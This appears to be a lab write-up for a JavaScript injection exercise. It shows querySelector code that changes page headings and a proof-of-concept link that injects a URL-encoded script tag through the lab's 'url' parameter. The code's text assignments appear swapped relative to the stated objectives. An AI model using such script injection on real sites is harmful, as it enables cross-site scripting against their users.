## Task 1 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/1)</small>

Objectives:

1. Modify the text "Modify me" to "Modified you"
2. Modify the text "Find me" to "Found you"

In this we need to find the elements containing "Modify me" and "Find me", then change the text to "Modified you" and "Found you" respectively.

So if you see the source code, you will see the target elements are `h1` and `h2` with attributes `align="center"` and `class="form-signin-heading"` respectively.

<img src="https://i.ibb.co/52s80X7/image.png" alt="image" border="0">

The following is the approach that comes to our mind using [Document.querySelector()](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector)

```js
document.querySelector("h1[align=center]").innerText = "Found you";
document.querySelector("h2[class=form-signin-heading]").innerText = "Modified you";
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/1?url=%3Cscript%3Edocument.querySelector%28%22h1%5Balign%3Dcenter%5D%22%29.innerText%20%3D%20%22Found%20you%22%3B%0Adocument.querySelector%28%22h2%5Bclass%3Dform-signin-heading%5D%22%29.innerText%20%3D%20%22Modified%20you%22%3B%3C/script%3E)
